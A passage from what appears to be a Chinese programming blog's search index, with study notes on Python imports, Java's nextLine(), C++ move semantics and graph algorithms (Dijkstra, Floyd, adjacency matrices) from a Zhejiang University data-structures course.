class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> package.module1 <span class="keyword">as</span> m</span><br></pre></td></tr></table></figure><p>会直接将m指向package.module1所指向的命名空间，并不会生成init.py的空间，也就不会有package变量</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 关于nextLine()与输入流</title>
      <link href="/2023/06/12/Java%20%E5%85%B3%E4%BA%8EnextLine()%E4%B8%8E%E8%BE%93%E5%85%A5%E6%B5%81/"/>
      <url>/2023/06/12/Java%20%E5%85%B3%E4%BA%8EnextLine()%E4%B8%8E%E8%BE%93%E5%85%A5%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<h4 id="Java-关于nextLine-与输入流"><a href="#Java-关于nextLine-与输入流" class="headerlink" title="Java 关于nextLine()与输入流"></a>Java 关于nextLine()与输入流</h4><ul><li><p>in.next()、in.nextInt()等函数会读取输入流中&#x3D;&#x3D;空格&#x3D;&#x3D;和&#x3D;&#x3D;回车键&#x3D;&#x3D;前面的数据，并不会将这两个读进去</p></li><li><p>而in.nextLine()函数会读取整个输入流中的数据，包括&#x3D;&#x3D;空格&#x3D;&#x3D;和&#x3D;&#x3D;回车键&#x3D;&#x3D;，并在读取后将回车键剔除</p></li></ul><p>如果在in.nextInt()函数后紧跟in.nextLine()函数：</p><ol><li><p>比如输入13</p></li><li><p>那么，in.nextInt()函数读取了输入流中的13，留下回车键，到了in.nextLine()函数后，发现输入流中还有东西，那么in.nextLine()函数会读取这个回车键，然后就当读完了，读取后将回车键剔除，留下&#x3D;&#x3D;空&#x3D;&#x3D;。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++移动语义</title>
      <link href="/2023/04/01/C++%E7%A7%BB%E5%8A%A8%E8%AF%AD%E4%B9%89/"/>
      <url>/2023/04/01/C++%E7%A7%BB%E5%8A%A8%E8%AF%AD%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<h1 id="移动语义"><a href="#移动语义" class="headerlink" title="移动语义"></a>移动语义</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">String</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">String</span>() = <span class="keyword">default</span>;</span><br><span class="line"><span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>* string) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create...\n&quot;</span>);</span><br><span class="line">m_Size = (<span class="type">uint32_t</span>)<span class="built_in">strlen</span>(string);</span><br><span class="line">m_Str = <span class="keyword">new</span> <span class="type">char</span>[m_Size];</span><br><span class="line"><span class="built_in">memcpy</span>(m_Str, string, m_Size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">String</span>(<span class="type">const</span> String&amp; other) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Copy...\n&quot;</span>);</span><br><span class="line">m_Size = other.m_Size;</span><br><span class="line">m_Str = <span class="keyword">new</span> <span class="type">char</span>[m_Size];</span><br><span class="line"><span class="built_in">memcpy</span>(m_Str, other.m_Str, m_Size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">String</span>(String&amp;&amp; other) <span class="keyword">noexcept</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Move...\n&quot;</span>);</span><br><span class="line">m_Size = other.m_Size;</span><br><span class="line">m_Str = other.m_Str;</span><br><span class="line">other.m_Size = <span class="number">0</span>;</span><br><span class="line">other.m_Str = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line">String&amp; <span class="keyword">operator</span>=(String&amp;&amp; other) <span class="keyword">noexcept</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Move...\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span> != &amp;other) &#123;</span><br><span class="line"><span class="keyword">delete</span>[] <span class="keyword">this</span>-&gt;m_Str;</span><br><span class="line"></span><br><span class="line">m_Size = other.m_Size;</span><br><span class="line">m_Str = other.m_Str;</span><br><span class="line">other.m_Size = <span class="number">0</span>;</span><br><span class="line">other.m_Str = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">String</span>() &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Destroyed...\n&quot;</span>);</span><br><span class="line"><span class="keyword">delete</span> m_Str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; m_Size; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, m_Str[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span>* m_Str;</span><br><span class="line"><span class="type">uint32_t</span> m_Size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Entity</span>(<span class="type">const</span> String&amp; name) : <span class="built_in">m_Name</span>(name) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Entity</span>(String&amp;&amp; name) : <span class="built_in">m_Name</span>(std::<span class="built_in">move</span>(name)) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">m_Name.<span class="built_in">Print</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">String m_Name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//Entity entity(&quot;Cherno&quot;);</span></span><br><span class="line"><span class="comment">//entity.PrintName();</span></span><br><span class="line"><span class="comment">//String string = &quot;Hello&quot;;</span></span><br><span class="line"><span class="comment">//String des(std::move(string));</span></span><br><span class="line"></span><br><span class="line">String apple = <span class="string">&quot;Apple&quot;</span>;</span><br><span class="line">String dest;</span><br><span class="line">apple.<span class="built_in">Print</span>();</span><br><span class="line">dest.<span class="built_in">Print</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----\n&quot;</span>);</span><br><span class="line">dest = std::<span class="built_in">move</span>(apple);</span><br><span class="line">apple.<span class="built_in">Print</span>();</span><br><span class="line">dest.<span class="built_in">Print</span>();</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【浙大数据结构】图论算法</title>
      <link href="/2023/02/28/%E3%80%90%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/"/>
      <url>/2023/02/28/%E3%80%90%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="图论算法"><a href="#图论算法" class="headerlink" title="图论算法"></a>图论算法</h1><hr><h2 id="Dijkstra"><a href="#Dijkstra" class="headerlink" title="Dijkstra"></a>Dijkstra</h2><h4 id="前引"><a href="#前引" class="headerlink" title="前引"></a>前引</h4><ul><li><p>令S &#x3D; {源点s + 已经确定了最短路径的顶点v<del>i</del>}</p></li><li><p>对任一未收录的顶点v，定义dist[v]为s到v的最短路径长度，但该路<u>径仅经过S中的顶点</u>。即路径{s -&gt; (v<del>i</del>∈S) -&gt; v}的最小长度</p></li><li><p>若路径是按照递增（非递减）的顺序生成的，则</p><ul><li>真正的最短路径必须经过S中的顶点</li><li>每次从未收录的顶点中选一个dist最小的的收录（&#x3D;&#x3D;贪心&#x3D;&#x3D;）</li><li>增加一个v进入S，可能影响另一个w的dist值！<ul><li><u>dist[w] &#x3D; min{dist[w], dist[v] + &lt;v, w&gt;的权重}</u></li></ul></li></ul></li></ul><h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Dijkstra</span><span class="params">(Vertex s)</span></span><br><span class="line">&#123; <span class="comment">//除了dist[s]=0外，其它的dist[V]=Infinity</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        V = 未收录顶点中dist最小者;</span><br><span class="line">        <span class="keyword">if</span> (这样的V不存在)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        collected[V] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 先收录再更新</span></span><br><span class="line">        <span class="keyword">for</span> (V 的每个邻接点 W) &#123;</span><br><span class="line">            <span class="keyword">if</span> (collected[W] == <span class="literal">false</span>) &#123; </span><br><span class="line">           <span class="comment">//已经收录的结点不用比较了，因为已经收录的节点路径肯定比下面要比较的小</span></span><br><span class="line">                <span class="keyword">if</span> (dist[V] + E&lt;v, w&gt; &lt; dist[W]) &#123;</span><br><span class="line">                    dist[W] = dist[V] + E&lt;v, w&gt;; <span class="comment">//dist数组表示节点V距离源点s的最短路径</span></span><br><span class="line">                    path[W] = [V]; <span class="comment">//path数组表示节点W的上一个节点</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Floyd"><a href="#Floyd" class="headerlink" title="Floyd"></a>Floyd</h2><h4 id="前引-1"><a href="#前引-1" class="headerlink" title="前引"></a>前引</h4><ul><li>D^k^[ i ] [ j ]  &#x3D;  路径 {i -&gt; {l &lt;&#x3D; k} -&gt; j} 的最小长度</li><li>D^0^,D^1^, …, D^|v|-1^[ i ] [ j ]即给出了i到j的真正最短距离</li><li>最初的D^-1^,给两个顶点有直接边相连的D[i] [j]赋权值，没有直接边相连的赋 INF</li><li>当D^k-1^已经完成，递推到D^k^时：<ul><li>或者k ∉ 最短路径}{ i -&gt; {i &lt;&#x3D; k} -&gt;j },则D^k^ &#x3D; D^k-1^</li><li>或者k ∈ 最短路径{ i -&gt; {i &lt;&#x3D; k} -&gt;j },则该路径必定有两端最短路径组成：D^k^[i] [j] &#x3D; D^k-1^[i] [k] + D^k-1^[k] [j]</li></ul></li></ul><h4 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Floyd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j++) &#123;</span><br><span class="line">            D[i][j] = G[i][j]; <span class="comment">//D[i][j]初始化为它的邻接矩阵</span></span><br><span class="line">            P[i][j] = <span class="number">-1</span>; <span class="comment">//P数组表示i，j之间的路径，用-1表示此时i，j之间没有路径</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; N; k++)</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">                <span class="keyword">if</span> (k != i &amp;&amp; k != j &amp;&amp; i != j) <span class="comment">//i，j，k有相等情况就不用管</span></span><br><span class="line">                    <span class="keyword">if</span> (D[i][k] + D[k][j] &lt; D[i][j]) &#123;</span><br><span class="line">                   D[i][j] = D[i][k] + D[k][j];</span><br><span class="line">                        P[i][j]  = k; <span class="comment">//k为i，j之间的中间节点</span></span><br><span class="line">                    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始状态</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/Floyd1.png" alt="00"></p><p>最终状态<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/Floyd2.png" alt="00"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【浙大数据结构】图</title>
      <link href="/2023/02/28/%E3%80%90%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E5%9B%BE/"/>
      <url>/2023/02/28/%E3%80%90%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<p>##图</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/00.png" alt="00"></p><h4 id="抽象数据类型定义"><a href="#抽象数据类型定义" class="headerlink" title="抽象数据类型定义"></a>抽象数据类型定义</h4><ul><li><p>类型名称：图（Graph）</p></li><li><p>数据对象集：G(V,E)有一个<strong>非空</strong>的有限顶点集合V和一个有限边集合E组成(即一个图可以没有边，但一定要有节点)</p></li><li><p>操作集：对于任意图 G∈Graph，以及 v∈V，e∈E<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/15.png" alt="15"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/01.png" alt="01"></p><p>无方向的图叫无向图，有方向的图叫有向图；图的边上带了权重就叫网络</p></li></ul><h4 id="怎么在程序中表示一个图"><a href="#怎么在程序中表示一个图" class="headerlink" title="怎么在程序中表示一个图"></a>怎么在程序中表示一个图</h4><p>######邻接矩阵表示法</p><p>邻接矩阵G[N] [N]–N个顶点从0到N-1编号<br>$$<br>G[i][j] &#x3D; \begin{cases} 1,若&lt;v_i,v_j&gt;是G中的边 \ 0,否则 \end{cases}<br>$$<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/02.png" alt="02"></p><p>不难发现，这个矩阵的<strong>主对角线</strong>都为0，因为没有自回路；且这个矩阵关于对角线对称，因为是<strong>无向图</strong></p><p>那么有一个问题：对于无向图的存储，怎样可以省一般空间？<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/03.png" alt="03"></p><p>邻接矩阵 — 有什么好处？</p><ul><li><p>直观、简单、好理解</p></li><li><p>方便检查任意一对顶点是否存在边</p></li><li><p>方便找任一顶点的所有“邻接点”（有边直接相连的顶点）</p></li><li><p>方便计算任一顶点的“度”（从该点出发的边数为“出度”，指向该点的边数为“入度”）</p><p>无向图：对应行（或列）非0元素个数</p><p>有向图：对应行非0元素的个数是“出度”；对应列非0元素的个数是“入度”</p></li></ul><p>邻接矩阵 — 有什么不好？</p><ul><li><p>浪费空间 — 存稀疏图（点很多而边很少）</p><p>对稠密图（特别是完全图）还是很合算的</p></li><li><p>浪费空间 — 统计稀疏图中一共有多少条边</p></li></ul><h5 id="邻接表表示法"><a href="#邻接表表示法" class="headerlink" title="邻接表表示法"></a>邻接表表示法</h5><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/04.png" alt="04"></p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20230220160027887.png" alt="image-20230220160027887"></p><hr><h4 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h4><p>#####深度优先搜索（Depth First  Search, DFS）</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/05.png" alt="05"></p><p>若有N个顶点、E条边，时间复杂度是</p><ul><li>用邻接表存储图，有 O(N + E)</li><li>用邻接矩阵存储图，有 O( N^2^ )</li></ul><h6 id="广度优先搜索（Breadth-First-Search-BFS）"><a href="#广度优先搜索（Breadth-First-Search-BFS）" class="headerlink" title="广度优先搜索（Breadth First Search, BFS）"></a>广度优先搜索（Breadth First Search, BFS）</h6><p>类似于树的层序遍历，采用队列进行遍历</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/06.png" alt="06"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/07.png" alt="07"></p><h6 id="图不连通怎么办"><a href="#图不连通怎么办" class="headerlink" title="图不连通怎么办"></a>图不连通怎么办</h6><p>无向图：</p><p><strong>连通</strong>：如果从V到W存在一条（无向）路径，则称V和W是连通的<br><strong>路径</strong>：V和W的路径是一系列顶点{V，v<del>1</del>，v<del>2</del>，…，v<del>n</del>，W}的集合，其中任一对顶点间都要途中的边。<strong>路径长度</strong>是路径中的边数（如果带权，则是所有边的的权重和）。如果V到W之间的所有项都不同，则称<strong>简单路径</strong><br><u> 如果有两个顶点相同，则就是不简单路径，也就是回路</u><br><strong>回路</strong>：起点等于终点的路径<br><strong>连通图</strong>：图中任意两顶点均连通<br>对于不连通的图，我们仍然可以考虑不连通的子图,即：<br><strong>连通分量</strong>：<strong>无向图</strong>的&#x3D;&#x3D;极大&#x3D;&#x3D;连通子图</p><ul><li>极大顶点数：再加1个顶点就不连通</li><li>极大顶点数：包含图中所有顶点相连的所有边</li></ul><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/08.png" alt="08"></p><p>有向图：</p><p><strong>强连通</strong>：&#x3D;&#x3D;有向图&#x3D;&#x3D;中任意顶点V和W（V和W可以互相走向对方）之间存在双向路径，则称 &#x3D;&#x3D;V和W是强连通的&#x3D;&#x3D;<br><strong>强连通图</strong>：有向图中任意两顶点均强连通<br><strong>弱连通图</strong>：<u>将有向图的所有的有向边替换为无向边</u>，所得到图称为为原图的<strong>基图</strong>，如果基图是连通图，那么原图就是若连通图<br><strong>强连通分量</strong>：有向图的极大强连通子图<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/09.png" alt="09"></p><hr><p>DFS与BFS两个遍历算法&#x3D;&#x3D;只能遍历连通图&#x3D;&#x3D;，不能遍历不连通图<br>但是，可以将不连通图的每一个连通分量都看成是一个单位连通图，于是有了以下新的算法</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/10.png" alt="10"></p><hr><h4 id="图的建立"><a href="#图的建立" class="headerlink" title="图的建立"></a>图的建立</h4><h6 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GraphStruct</span>* <span class="title">PtrToGraph</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">GraphStruct</span>&#123;</span></span><br><span class="line"><span class="type">int</span> Nv; <span class="comment">//顶点数</span></span><br><span class="line"><span class="type">int</span> Ne; <span class="comment">//边数</span></span><br><span class="line">DataType Data[MaxVertexNumber]; <span class="comment">//存放顶点数据</span></span><br><span class="line">WeightType G[MaxVertexNumber][MaxVertexNumber];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> PtrToGraph MGraph;</span><br></pre></td></tr></table></figure><p>初始化一个图</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Vertex;</span><br><span class="line">MGraph <span class="title function_">GraphCreate</span><span class="params">(<span class="type">int</span> VertexNum)</span> <span class="comment">//初始化一个有顶点但没有边的图</span></span><br><span class="line">&#123;</span><br><span class="line">Vertex V, W;</span><br><span class="line">MGraph Graph;</span><br><span class="line"></span><br><span class="line">Graph = (MGraph)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> GraphStruct));</span><br><span class="line">Graph-&gt;Nv = VertexNum;</span><br><span class="line">Graph-&gt;Ne = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(V = <span class="number">0</span>; V &lt; Graph-&gt;Nv; V++)&#123;</span><br><span class="line"><span class="keyword">for</span>(W = <span class="number">0</span>; W &lt; Graph-&gt;Nv; W++)&#123;</span><br><span class="line">Graph-&gt;G[V][W] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Graph;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>插入边</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ENode</span>* <span class="title">PtrToENode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ENode</span>&#123;</span></span><br><span class="line">Vertex V1, V2; <span class="comment">//有向边&lt;V1, V2&gt;</span></span><br><span class="line">WeightType Weight;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> PtrToENode Edge;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertEdge</span><span class="params">(MGraph Graph, Edge E)</span></span><br><span class="line">&#123;</span><br><span class="line">Graph-&gt;G[E-&gt;V1][E-&gt;V2] = E-&gt;Weight; <span class="comment">//插入边&lt;V1, V2&gt;</span></span><br><span class="line"></span><br><span class="line">Graph-&gt;G[E-&gt;V2][E-&gt;V1] = E-&gt;Weight; <span class="comment">//若是无向图,还要插入边&lt;V2, V1&gt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体构建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">MGraph <span class="title function_">BuildGraph</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">Edge E;</span><br><span class="line">Vertex V;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Nv;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;Nv);</span><br><span class="line">MGraph Graph = GraphCreate(Nv);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;Graph-&gt;Ne);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(Graph-&gt;Ne)&#123;</span><br><span class="line">E = (Edge)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ENode));</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; Graph-&gt;Ne; i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,</span><br><span class="line">&amp;E-&gt;V1, &amp;E-&gt;V2, &amp;E-&gt;Weight);</span><br><span class="line">InsertEdge(Graph, E);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果顶点有数据</span></span><br><span class="line"><span class="keyword">for</span>(V = <span class="number">0</span>; V &lt; Graph-&gt;Nv; V++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;Graph-&gt;Data[V]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Graph;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简化版(考试用)<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/11.png" alt="11"></p><h6 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h6><p><img 